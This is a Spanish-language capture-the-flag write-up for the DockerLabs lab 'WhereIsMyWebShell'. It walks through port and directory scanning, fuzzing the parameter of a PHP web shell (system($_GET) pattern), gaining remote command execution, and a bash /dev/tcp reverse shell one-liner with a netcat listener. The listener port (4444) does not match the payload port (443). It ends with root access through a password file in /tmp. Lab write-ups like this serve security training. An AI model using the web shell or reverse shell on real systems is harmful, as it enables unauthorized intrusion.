---
title: WhereIsMyWebShell - DockerLabs
published: true
categories: DockerLabs
---


| OS     | Dificultad  | Creator           |
| ------ | ----------- | -------------     | 
| Linux  |  Fácil      | El Pingüino de Mario        | 


# Reconocimiento

Comenzamos el proceso de reconocimiento identificando los puertos abiertos en el sistema objetivo. 
```shell
sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG ports 
```
-  `-p-`: Escanea todos los puertos (1-65535).
- `--open`: Solo muestra los puertos abiertos.
- `-sS`: Realiza un escaneo SYN, que es rápido y discreto.
- `--min-rate=5000`: Envía al menos 5000 paquetes por segundo, acelerando el escaneo.
- `-n`: No realiza resolución DNS.
- `-Pn`: No realiza ping previo para determinar si el host está activo.
- `-vvv`: Muestra resultados detallados y en tiempo real.

![image](https://github.com/user-attachments/assets/2adb662a-8cba-48da-82eb-b98ff3962e89)

Durante el escaneo, descubrimos que los siguientes puertos están activos:
- `80` (HTTP)
A continuación, evaluamos si los puertos abiertos presentan alguna vulnerabilidad, además de obtener más información sobre los servicios asociados a esos puertos.
```bash
nmap -p80 -sCV 172.17.0.2 -oG targeted
```
![image](https://github.com/user-attachments/assets/2f018b31-e463-4902-93b8-fc617163684a)

# Exploración Web
Al analizar el puerto `80`, encontramos una pagina de una academia de ingles.

![image](https://github.com/user-attachments/assets/a971e2a2-d111-40ad-b831-fca9dff08a03)

Podemos observar que nos tiene un mensaje guardado que dice `Guardo un secretito en /tmp ;)`.

![image](https://github.com/user-attachments/assets/5b31edab-c844-4794-9505-8742014b107a)

Utilizamos `Gobuster` para realizar un reconocimiento web y explorar los directorios disponibles en el sitio.
```bash
gobuster dir -u http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,doc,html,txt,img
```
- `gobuster dir` - Indica que estás utilizando la herramienta Gobuster para realizar un escaneo de directorios.
- `-u http://172.17.0.2/` Especifica la URL objetivo que deseas escanear en busca de directorios.
- `-w` Especifica que diccionario queremos usar
- `-x` Para indicar que tipo de extension queremos que nos encuentre

![image](https://github.com/user-attachments/assets/9032b1e7-3e90-49c1-b5cf-7119fa622888)

Encontramos dos archivos interesantes: **warning.html** y **shell.php**

Explorando `warning.html` nos da pista sobre que `shell.php` tiene que tener una estructurura similar a esta:

![image](https://github.com/user-attachments/assets/225a25fe-307b-427e-a8e9-01a63a9bfde4)
```php
<?php
	system($_GET['shell']);
?>
```

Pero el parametro `shell` no sabemos si ese es el que tiene asi que haremos fuzzing para adivinar que parametro usa:
```bash
wfuzz -c --hl 0 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://172.17.0.2/shell.php?FUZZ=id"
```
![image](https://github.com/user-attachments/assets/07c2a329-e749-477a-a9b1-478951bce4b8)

Vemos que el parámetro -> "**parameter**" con el comando **id** que le hemos pasado, nos devuelve 2 líneas a diferencia del resto. Nos dirigimos a la web a comprobar que funciona y efectivamente hemos logrado un **RCE**. (Ejecución remota de comandos).

![image](https://github.com/user-attachments/assets/920b5471-35d4-458a-9d0e-de1f3fc5c7a9)

## Reverse Shell

Añadiremos al **RCE** , en la url en vex del comando `id` añadiremos lo siguiente:

```bash
bash -c "bash -i >%26 /dev/tcp/192.168.10.150/443 0>%261"
```

Simultáneamente, iniciamos `netcat` en nuestro sistema para escuchar conexiones entrantes:

```bash 
nc -lvnp 4444
```
Al acceder a la reverse shell desde el navegador, logramos obtener acceso como `www-data`.

![image](https://github.com/user-attachments/assets/c59d752e-01b7-4776-8203-f937f296d8d5)


## TTY ReverseShell

### Iniciar una sesión de shell interactiva
En nuestra shell básica, ejecutamos el siguiente comando para forzar la creación de una sesión de bash interactiva:
```bash
script /dev/null -c bash
```
### Suspender la shell
Una vez que el comando anterior está en ejecución, utilizamos
```bash
Control+Z
```
para suspender temporalmente nuestra shell.

### Preparar nuestro terminal local:
Antes de volver a nuestra shell, configuramos nuestro terminal local:
```bash
stty raw -echo; fg
```

### Resetear la configuración del terminal
Ahora que tenemos el control de la shell, la reseteamos para asegurar que se comporta correctamente:
```bash
reset
```

### Configura el tipo de terminal:
```bash
xterm
export TERM=xterm
export SHELL=bash
```

# Intrusion 

Si os acordais no comentaron que tenian un secreto guardado en `/tmp` por lo que accederemos alli.

```bash
ls -la
```

Hay un archivo oculta llamado `.secret.txt` , el cual contiene la contraseña de root.

![image](https://github.com/user-attachments/assets/130efbd1-e383-4d6e-b066-57e84c42d871)

Accedemos con root.
```bash
su root
```
Ya somos root.

![image](https://github.com/user-attachments/assets/4683c0d8-7892-4a30-93ec-632a7801bcec)
